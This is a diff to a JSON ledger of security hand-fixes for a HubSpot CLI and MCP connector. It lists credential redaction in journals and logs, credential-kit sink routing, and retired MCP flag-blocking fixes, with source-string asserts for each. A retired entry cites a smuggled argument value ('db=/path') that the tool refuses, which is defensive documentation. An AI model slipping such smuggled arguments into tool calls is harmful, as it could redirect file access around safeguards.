+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_nb_collected_test.go",
+     "contains": "func TestNBFilterOnAnUncollectedPropertyRefuses(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_collected.go",
+     "contains": "for _, p := range append(strings.Split(strings.Trim(collected, \",\"), \",\"), filterFields...) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_collected.go",
+     "not_contains": "for _, p := range append(append([]string{}, hsReportProperties[resource]...), filterFields...) {"
+    },
+    {
+     "file": "cli/internal/cli/hs_nb_collected_test.go",
+     "contains": "func TestNB2ReportRefusesAnUncollectedDefaultProperty(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/deals_forecast.go",
+     "contains": "hsRequireCollected(cmd.Context(), db, \"deals forecast\", \"hubspot-deals-crm\")",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/deals_velocity.go",
+     "contains": "hsRequireCollected(cmd.Context(), db, \"deals velocity\", \"hubspot-deals-crm\")",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/contacts_win_back.go",
+     "contains": "hsRequireCollected(cmd.Context(), db, \"contacts win-back\", \"hubspot-deals-crm\")",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/nurture_mine.go",
+     "contains": "hsRequireCollected(cmd.Context(), db, \"nurture-mine\", \"hubspot-deals-crm\")",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/notes_signals.go",
+     "contains": "hsRequireCollected(cmd.Context(), db, \"notes signals\", \"hubspot-deals-crm\")",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_nb3_reports_test.go",
+     "contains": "func TestNB3EveryReportReadingStoredPropertiesRequiresThemCollected(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_nb3_reports_test.go",
+     "contains": "func TestNB3ForecastAndVelocityRefuseAnUncollectedProperty(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "journal-credential-hardening",
+   "class": "secret-persisted",
+   "status": "active",
+   "summary": "The learn journal and every file the program persists keep no credential the operator typed in place of a name: the HUBSPOT_LEARN_SESSION override is stored as \"o:\" plus the same 64-bit SHA-256 hash the harness session ids get under \"h:\"; argv_shape records only flag names the invoked command declares under exactly the typed name and every other name as the \"<undeclared>\" placeholder (redacted), and nothing after \"--\"; failed_flag is never kept as typed (\"--<undeclared>\" when Cobra matched it to a declared flag, otherwise dropped); teach.log's missing --query lines record argument counts; a journal entry is appended through credkit.AppendFile once every field (time, session key, learn context) is filled, so the kit withholds the whole record when any field carries a held credential; and what a command persists from what the operator typed (teach, recall, profile save, feedback) passes the kit's file, SQLite and outbound sinks, which withhold the unit that carries a held credential. journal_credential_hardening_test.go drives each path with a credential, not held and held, and fails if it reaches any file under the test home or the feedback host.",
+   "why": "Press 4.34.0 (learn/journal.go.tmpl) returns the override raw from JournalSessionKey, so a credential set there is written to journal-*.jsonl on every command, and records every typed flag name, so a credential typed as a flag name (or after --) becomes an argv_shape key and the failed_flag; teach.log records the raw arguments of a teach with no --query; and teach, recall, teach-lookup, profile save and feedback persist the operator's text verbatim. The fleet tool for this class will not merge (owner decision 2026-10-28), so the connector closes it by hand. Known limits: a guessable override can be confirmed by hashing guesses; entries an older build wrote stay until the 14-day retention deletes their segment; text that carries no held value (a recall query) is kept as the press designs it.",
+   "spec_encode_followup": "Press-side: learn/journal.go.tmpl should hash the LEARN_SESSION override as it hashes harness ids, and JournalArgvShape should take the invoked command's declared-flag lookup and record any other name as a placeholder, stopping at \"--\"; the failed flag should be the placeholder too, teach.log should not echo raw arguments.",
+   "asserts": [
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "return \"o:\" + hashHarnessSession(v)\n\t}",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "not_contains": "journalSessionEnvVar)); v != \"\" {\n\t\treturn v\n"
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "const journalUndeclaredFlag = \"<undeclared>\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "func JournalArgvShape(args []string, isBoolFlag, isDeclared func(name string) bool) map[string]string {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "if tok == \"--\" {\n\t\t\tbreak\n\t\t}\n\t\tif !strings.HasPrefix(tok, \"-\") || tok == \"-\" {\n\t\t\tcontinue\n\t\t}",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "if isDeclared == nil || !isDeclared(name) {\n\t\t\tshape[journalUndeclaredFlag] = journalClassRedacted\n\t\t\tcontinue\n\t\t}\n\t\tswitch {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "if entry.FailedFlag != \"\" && entry.SuggestedFlag != \"\" {\n\t\tentry.FailedFlag = \"--\" + journalUndeclaredFlag\n\t} else {\n\t\tentry.FailedFlag = \"\"\n\t}",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "if entry.SessionKey == \"\" {\n\t\tentry.SessionKey = JournalSessionKey()\n\t}",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "lookupFlag := func(name string) *pflag.Flag {\n\t\tf := target.Flags().Lookup(name)\n\t\tif f == nil {\n\t\t\tf = target.InheritedFlags().Lookup(name)\n\t\t}\n\t\tif f == nil && len(name) == 1 {\n\t\t\tf = target.Flags().ShorthandLookup(name)\n\t\t}\n\t\treturn f\n\t}",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "isDeclaredFlag := func(name string) bool {\n\t\tf := lookupFlag(name)\n\t\treturn f != nil && (f.Name == name || f.Shorthand == name)\n\t}",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "learn.JournalArgvShape(os.Args[1:], isBoolFlag, isDeclaredFlag)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "not_contains": "learn.JournalArgvShape(os.Args[1:], isBoolFlag)"
+    },
+    {
+     "file": "cli/internal/cli/teach.go",
+     "contains": "writeTeachErrLog(fmt.Sprintf(\"teach: missing --query (%d args, %d resources)\", len(args), len(resources)))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/teach.go",
+     "not_contains": "args=%v"
+    },
+    {
+     "file": "cli/internal/cli/teach_playbook.go",
+     "contains": "writeTeachErrLog(fmt.Sprintf(\"playbook amend: missing --query (%d args)\", len(args)))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/teach_playbook.go",
+     "not_contains": "args=%v"
+    },
+    {
+     "file": "cli/internal/learn/journal_credential_hardening_test.go",
+     "contains": "func TestJournalCredentialHardening(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "credkit.AppendFile(p, append(line, '\\n'), 0o600)",
+     "min_count": 1,
+     "code_only": true
     }
    ]
   },
@@ -609,6 +2267,180 @@
    ]
   },
   {
+   "id": "credkit-wiring",
+   "class": "credential-kit",
+   "status": "active",
+   "summary": "The shared credential kit (tools/maintainer/credkit, vendored at cli/internal/credkit) is wired by hand: internal/credwire/declarations.go holds the one credkit.Declarations literal (SecretEnv HUBSPOT_ACCESS_TOKEN and HUBSPOT_MCP_HTTP_TOKEN; Files = the one file the program discovers its base URL in (config.BaseURLFile, with --home read by the CLI's own command tree; the kit takes the base URL from an explicit --config over it), every other file a run may read held directly through config.HoldFile so its base_url cannot become the allowed origin; ConfigFields auth_header, access_token, refresh_token, client_id, client_secret; BaseURL base_url / HUBSPOT_BASE_URL / https://api.hubapi.com; every credential bound to the base_url origin, the MCP bearer and the TLS key to none). The MCP server holds every value --tls-key could have before it parses flags. internal/cli/hs_profile_hold.go holds what a run profile store carries as a credential at startup: a value under a credential's name or under base-url, every duplicate included (free text is not a source). internal/credsql registers the one credkit-sqlite driver, with the MCP sql tool's value cap set as each connection opens. credkit.Start is the first statement of both mains and credkit.Exit ends them. Every sink is routed: stdout and stderr at the descriptor, the API client's cliutil.OutboundGuard, deliver, feedback and the auth probe through credkit.Transport, cache, journal, teach log, profile and export files through credkit.WriteFile, AppendFile, OpenFile and NewWriter, the MCP server through MCPTools, MCPIn, MCPOut and MCPHTTP, child processes through RunCommand and StartCommand. The connector's own 0600 credential store and config file are credential sources: their writes stay outside the kit in cliutil.AtomicWriteCredentialFile.",
+   "why": "Retires secret-echo-decoded-funnel, secret-echo-success-bodies and secret-echo-held-chokepoint, replaced by the shared credential kit (entries removed: the ledger's retired list only takes retirements fleet_handfixes.json backs). That filter kept growing per review round because each sink and encoding was closed one at a time. The kit is one shared implementation of the leak contract, checked byte for byte against tools/maintainer/credkit (vendor_credkit.py --check). A match withholds the whole unit, and a credentialed request over plain http or to another origin is refused. Local files the connector writes that carry no credential by construction (lock files, the fingerprint key, the SQLite journal stub) are not routed.",
+   "spec_encode_followup": "Press-side: the press should vendor the kit and generate the Start and Exit lines and the sink routing, so a reprint keeps them.",
+   "asserts": [
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "var Declarations = credkit.Declarations{",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "{Source: \"*\", Allowed: []string{\"base_url\"}},",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/hubspot-cli/main.go",
+     "contains": "credkit.Start(credwire.Declarations)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/hubspot-cli/main.go",
+     "not_contains": "os.Exit("
+    },
+    {
+     "file": "cli/cmd/hubspot-mcp/main.go",
+     "contains": "credkit.Start(credwire.Declarations)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/hubspot-mcp/main.go",
+     "not_contains": "os.Exit("
+    },
+    {
+     "file": "cli/cmd/hubspot-cli/main.go",
+     "contains": "credkit.Exit(code)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/hubspot-mcp/main.go",
+     "contains": "credkit.Exit(run())",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/hubspot-mcp/main.go",
+     "contains": "server.WithToolHandlerMiddleware(credkit.MCPTools)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/hubspot-mcp/main.go",
+     "contains": "credkit.MCPIn(os.Stdin), credkit.MCPOut()",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/hubspot-mcp/main.go",
+     "contains": "credkit.MCPHTTP",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credsql/credsql.go",
+     "contains": "credkit.SQLDriver(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "sql.Open(credsql.Driver",
+     "min_count": 3,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/platform/migration.go",
+     "contains": "sql.Open(credsql.Driver",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/credkit_hold.go",
+     "contains": "var OutboundGuard = credkit.Transport",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "sendClient.Transport = cliutil.OutboundGuard(httpClient.Transport)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "cliutil.HoldCredential(\"minted:authorization\", authHeader)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "credkit.WriteFile(cacheFile+\".platform.json\", data, 0o600)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/deliver.go",
+     "contains": "credkit.Transport(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/feedback.go",
+     "contains": "credkit.Transport(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/probe.go",
+     "contains": "credkit.Transport(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "credkit.AppendFile(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "contains": "credkit.Terminal(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "contains": "credkit.RunCommand(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "config.BaseURLFile()",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "config.HoldFile(f)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/hubspot-mcp/main.go",
+     "contains": "credkit.FlagValues(os.Args[1:], \"--tls-key\")",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "cli.HoldProfileStores()",
+     "min_count": 2,
+     "code_only": true
+    }
+   ]
+  },
+  {
    "id": "no-unbacked-only-claim",
    "summary": "The README says \"an open-source HubSpot CLI/MCP that captures\", not \"the only HubSpot CLI/MCP\"",
    "why": "The press narrative claimed an exclusivity ('the only HubSpot CLI/MCP') that cannot be backed up, and CONTRIBUTING.md requires comparisons to be accurate and verifiable. A reprint regenerates these files from the narrative and would restore the claim.",
@@ -624,6 +2456,38 @@
      "not_contains": "the only HubSpot CLI/MCP"
     }
    ]
+  }
+ ],
+ "retired": [
+  {
+   "id": "mcp-filesystem-destination-gate",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Press 4.34.0 builds a per-command blocked set (blockedDestinationFlags, blockedInputFlags, root control-plane flags), removes those flags from each tool's schema, refuses any undeclared argument name (so \"db=/path\" is refused) and skips '=' names in cliArgsFromMCP."
+  },
+  {
+   "id": "mcp-argv-value-joined",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Upstreamed as cli-printing-press #4647: every value-carrying branch of cliArgsFromMCP joins the value to its flag (--k=v, one element per list item), and the press generates TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag."
+  },
+  {
+   "id": "windows-sddl-alias-sid-compare",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Upstreamed as cli-printing-press #5041 (4.33.6): trustees are resolved to SIDs (LA through the OS) and compared by SID; the press generates the alias tests."
+  },
+  {
+   "id": "windows-null-dacl-behind-flags",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Upstreamed as cli-printing-press #5041 (4.33.6): the DACL section's flags and ACE list are framed (daclFlagsRe, aceListRe), so a NULL DACL behind flags is refused."
+  },
+  {
+   "id": "interim-http-security-note-2026-10-22",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: The note paused HTTP mode until a reprint because the build served HTTP with no token. Press 4.34.0 HTTP mode refuses to start without <PREFIX>_MCP_HTTP_TOKEN, answers 401 without the right bearer, binds 127.0.0.1 by default and refuses a non-loopback address without TLS; onboard.py now writes HTTP guidance that follows the binary (cc-skills #14) and never writes this note, so the entry would fail on every re-onboard."
+  },
+  {
+   "id": "mcp-file-flags-refused",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Press 4.34.0's cobratree mirror derives one blocked set per command (destination, input, mcp:write-flags, mcp:read-flags and root control-plane flags), leaves those flags out of the tool schema and refuses them, and any undeclared argument, by name."
   }
  ]
 }
